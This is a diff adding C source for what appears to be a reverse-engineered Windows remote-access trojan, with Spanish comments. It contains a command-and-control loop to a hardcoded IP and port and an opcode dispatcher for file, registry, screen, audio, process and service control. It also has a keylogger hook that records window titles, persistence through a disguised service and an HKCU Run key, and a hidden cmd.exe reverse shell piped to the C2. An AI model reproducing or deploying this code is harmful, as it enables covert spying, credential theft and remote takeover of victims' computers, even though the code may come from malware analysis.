@@ -1,0 +1,366 @@
+void BuclePrincipalC2(char *param_host_arg) {
+    HWINSTA hWinSta;
+    HANDLE hThreadAdmin;
+    TransportContext transport_ctx;
+    AdminContext admin_ctx;
+    char szMutexName[52];
+    char szVictimID[256];
+    char szC2Address[16];
+    DWORD dwPort;
+    DWORD dwTickStart, dwTickCurrent;
+
+    memset(szVictimID, 0, sizeof(szVictimID));
+    memset(szMutexName, 0, sizeof(szMutexName));
+
+    // Abrir estación de ventana por defecto
+    char *szWinSta = DesofuscarStringXor("\x07\xBC\xA3\xA7\xBB\xB3\xA7\xF5"); // "WinSta0"
+    hWinSta = OpenWindowStationA(szWinSta, FALSE, MAXIMUM_ALLOWED);
+    DesofuscarFree(szWinSta);
+    if (hWinSta != NULL) {
+        SetProcessWindowStation(hWinSta);
+    }
+
+    // Configuración de filtro de excepciones y generación de ID
+    if (g_hModule != NULL) {
+        SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)CallbackRecuperacion);
+        if (param_host_arg != NULL) {
+            lstrcpyA(szVictimID, param_host_arg);
+        }
+        dwTickStart = GetTickCount();
+        dwTickCurrent = GetTickCount();
+        wsprintfA(szMutexName, "%d%d", dwTickCurrent, dwTickStart);
+    }
+
+    SetErrorMode(SEM_FAILCRITICALERRORS);
+
+    // Intentar instalar persistencia en el sistema
+    IntentarPersistencia();
+
+    // Cargar dirección IP (160.202.231.41) y Puerto (4377)
+    lstrcpyA(szC2Address, (char*)&DAT_1002c004);
+    dwPort = DAT_1002c108; // 0x00001119 (4377)
+
+    // Inicializar transporte y buffers
+    ConstruirTransporte(&transport_ctx);
+
+    while (TRUE) {
+        // Intentar conectar con la infraestructura C2
+        if (!ConectarDestinoConfigurado(&transport_ctx, szC2Address, dwPort)) {
+            // Reintentar conexión tras retardo
+            Sleep(3000);
+            continue;
+        }
+
+        // Transmitir metadatos iniciales del host infectado
+        InformarEquipo(&transport_ctx);
+
+        // Inicializar hilo de administración y hooks
+        ConstruirAdministrador(&admin_ctx, &transport_ctx, szVictimID);
+
+        // Bucle de monitoreo de sesión
+        while (TRUE) {
+            HANDLE hEvent = OpenEventA(EVENT_ALL_ACCESS, FALSE, szMutexName);
+            DWORD dwWaitStatus = WaitForSingleObject(admin_ctx.hEventShutdown, 100);
+
+            if (hEvent != NULL) {
+                // Orden de desconexión o reinicio
+                CerrarTransporte(&transport_ctx);
+                CloseHandle(hEvent);
+                DestruirAdministrador(&admin_ctx);
+                SetErrorMode(0);
+                TerminarTransporte(&transport_ctx);
+                return;
+            }
+
+            if (dwWaitStatus == WAIT_OBJECT_0) {
+                // La sesión perdió conectividad
+                break;
+            }
+            Sleep(500);
+        }
+
+        // Limpieza de subobjetos antes de reconectar
+        DestruirAdministrador(&admin_ctx);
+    }
+}
+
+void DespacharModuloRemoto(SessionContext *pSession, CommandPacket *pPacket) {
+    BYTE bOpcode = pPacket->Header.Opcode;
+
+    switch (bOpcode) {
+        case 0x00: // Handshake / Keepalive
+            EnviarRespuestaAck(pSession);
+            break;
+
+        case 0x01: // Exploración y Operaciones de Archivos
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)DespacharOperacionesArchivo, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x05: // Gestión de Registro de Windows
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)DespacharExploracionRegistro, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x10: // Captura de Pantalla e Inyección de Inputs (Control Remoto)
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)DespacharControlEscritorio, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x1B: // Control del Keylogger
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)ControlarEstadoKeylogger, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x1E: // Módulo de Captura de Audio
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)ConstruirModuloAudio, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x1F:
+        case 0x21: // Listado e Inspección de Procesos y Ventanas
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)ControlarProcesosYVentanas, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x25: // Shell Remota (cmd.exe)
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)CrearShellConPipes, 
+                pPacket, 
+                0
+            );
+            break;
+
+        case 0x28: // Administración de Servicios
+            CrearTrabajadorSincronizado(
+                (ThreadCallback)ControlarServicioRemoto, 
+                pPacket, 
+                0
+            );
+            break;
+
+        default:
+            // Opcode no reconocido
+            break;
+    }
+}
+
+BOOL IntentarPersistencia() {
+    CHAR szModulePath[MAX_PATH];
+    CHAR szTargetDirectory[MAX_PATH];
+    CHAR szTargetFilePath[MAX_PATH];
+    CHAR szServiceName[64];
+    CHAR szServiceValue[64];
+    CHAR szDisplayName[128];
+    SC_HANDLE hSCManager = NULL;
+    SC_HANDLE hService = NULL;
+    HKEY hKey = NULL;
+
+    // Generar nombres deterministas dinámicos
+    GenerarNombresPersistencia(szServiceName, szServiceValue, szDisplayName);
+
+    // Obtener la ruta del ejecutable anfitrión actual
+    if (GetModuleFileNameA(NULL, szModulePath, MAX_PATH) == 0) {
+        return FALSE;
+    }
+
+    // Obtener la ruta de Program Files (CSIDL 0x23)
+    if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szTargetDirectory) == S_OK) {
+        wsprintfA(szTargetFilePath, "%s\\Microsoft\\Windows\\%s", szTargetDirectory, szServiceName);
+
+        // Copiar el archivo al directorio oculto
+        if (CopiarInstalacionOculta(szModulePath, szTargetFilePath)) {
+            // Intentar registrar como Servicio de Windows
+            hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            if (hSCManager != NULL) {
+                hService = OpenServiceA(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
+
+                if (hService == NULL) {
+                    // Crear el servicio si no existe
+                    hService = CreateServiceA(
+                        hSCManager,
+                        szServiceName,         // Nombre interno del servicio
+                        szDisplayName,         // Nombre a mostrar (imita Windows)
+                        SERVICE_ALL_ACCESS,
+                        SERVICE_WIN32_OWN_PROCESS,
+                        SERVICE_AUTO_START,    // Inicio automático
+                        SERVICE_ERROR_NORMAL,
+                        szTargetFilePath,      // Ruta ejecutable instalada
+                        NULL, NULL, NULL, NULL, NULL
+                    );
+
+                    if (hService != NULL) {
+                        CloseServiceHandle(hService);
+                        CloseServiceHandle(hSCManager);
+                        return TRUE;
+                    }
+                } else {
+                    // Si ya existe, verificar la ruta e iniciar el servicio
+                    StartServiceA(hService, 0, NULL);
+                    CloseServiceHandle(hService);
+                    CloseServiceHandle(hSCManager);
+                    return TRUE;
+                }
+                CloseServiceHandle(hSCManager);
+            }
+        }
+    }
+
+    // Mantenimiento de Respaldo: Registro de Usuario (HKCU Run)
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szTargetDirectory) == S_OK) {
+        wsprintfA(szTargetFilePath, "%s\\Microsoft\\Windows\\WdiHost.exe", szTargetDirectory);
+
+        if (CopiarInstalacionOculta(szModulePath, szTargetFilePath)) {
+            LSTATUS lRes = RegCreateKeyExA(
+                HKEY_CURRENT_USER,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL
+            );
+
+            if (lRes == ERROR_SUCCESS) {
+                DWORD dwLen = lstrlenA(szTargetFilePath) + 1;
+                RegSetValueExA(hKey, szServiceValue, 0, REG_SZ, (BYTE*)szTargetFilePath, dwLen);
+                RegCloseKey(hKey);
+                return TRUE;
+            }
+        }
+    }
+
+    return FALSE;
+}
+
+// Instalar Hook Global (0x10005660)
+BOOL InstalarHookMensajes(SharedKeyState *pState) {
+    if (pState == NULL) return FALSE;
+
+    // Habilitar sección de memoria compartida
+    if (AbrirMappingTeclado() && g_pSharedMapping != NULL) {
+        // Instalar hook de tipo WH_GETMESSAGE
+        HHOOK hHook = SetWindowsHookExA(
+            WH_GETMESSAGE, 
+            (HOOKPROC)CallbackCapturaMensajes, 
+            g_hModule, 
+            0
+        );
+
+        if (hHook != NULL) {
+            g_pSharedMapping->hKeyboardHook = hHook;
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// Acumulación de Texto e Información de Contexto (0x10005540)
+void AcumularTextoTeclado(SharedKeyState *pState, WORD wVKey, CHAR cAscii) {
+    CHAR szWindowTitle[256];
+    CHAR szFormattedBuffer[512];
+    SYSTEMTIME st;
+
+    HWND hActiveWnd = GetActiveWindow();
+    memset(szWindowTitle, 0, sizeof(szWindowTitle));
+
+    if (hActiveWnd != NULL) {
+        GetWindowTextA(hActiveWnd, szWindowTitle, sizeof(szWindowTitle));
+    }
+
+    // Verificar si la ventana activa cambió respecto a la última captura
+    if (lstrcmpA(pState->szLastWindowTitle, szWindowTitle) != 0) {
+        GetLocalTime(&st);
+        lstrcpyA(pState->szLastWindowTitle, szWindowTitle);
+
+        // Dar formato con marca de tiempo y título de ventana
+        wsprintfA(
+            szFormattedBuffer, 
+            "\r\n[%02d/%02d %02d:%02d] (%s)\r\n", 
+            st.wMonth, st.wDay, st.wHour, st.wMinute, szWindowTitle
+        );
+        
+        // Copiar encabezado al buffer circular de memoria compartida
+        lstrcatA(pState->BufferTeclado, szFormattedBuffer);
+    }
+
+    // Agregar el carácter capturado al buffer
+    CHAR szKey[2] = { cAscii, '\0' };
+    lstrcatA(pState->BufferTeclado, szKey);
+}
+
+DWORD WINAPI CrearShellConPipes(ShellModuleContext *pContext) {
+    SECURITY_ATTRIBUTES sa;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    CHAR szSystemDir[MAX_PATH];
+    CHAR szCmdPath[MAX_PATH];
+
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    // Crear Pipe de Entrada (C2 -> cmd.exe)
+    if (!CreatePipe(&pContext->hPipeStdinRead, &pContext->hPipeStdinWrite, &sa, 0)) {
+        return 0;
+    }
+
+    // Crear Pipe de Salida (cmd.exe -> C2)
+    if (!CreatePipe(&pContext->hPipeStdoutRead, &pContext->hPipeStdoutWrite, &sa, 0)) {
+        CloseHandle(pContext->hPipeStdinRead);
+        CloseHandle(pContext->hPipeStdinWrite);
+        return 0;
+    }
+
+    // Configurar información de arranque ocultando la ventana del símbolo del sistema
+    GetStartupInfoA(&si);
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Ocultar proceso
+    si.hStdInput = pContext->hPipeStdinRead;
+    si.hStdOutput = pContext->hPipeStdoutWrite;
+    si.hStdError = pContext->hPipeStdoutWrite;
+
+    GetSystemDirectoryA(szSystemDir, MAX_PATH);
+    wsprintfA(szCmdPath, "%s\\cmd.exe", szSystemDir);
+
+    // Lanzar proceso cmd.exe
+    BOOL bCreated = CreateProcessA(
+        NULL, szCmdPath, NULL, NULL, TRUE, 
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi
+    );
+
+    if (bCreated) {
+        pContext->hProcessShell = pi.hProcess;
+        CloseHandle(pi.hThread);
+
+        // Crear hilo dedicado a leer la salida del pipe y transmitirla al C2
+        CrearTrabajadorSincronizado(
+            (ThreadCallback)RecogerSalidaShell, 
+            pContext, 
+            0
+        );
+        return 1;
+    }
+
+    // Limpieza en caso de error al instanciar cmd.exe
+    CloseHandle(pContext->hPipeStdinRead);
+    CloseHandle(pContext->hPipeStdinWrite);
+    CloseHandle(pContext->hPipeStdoutRead);
+    CloseHandle(pContext->hPipeStdoutWrite);
+    return 0;
+}
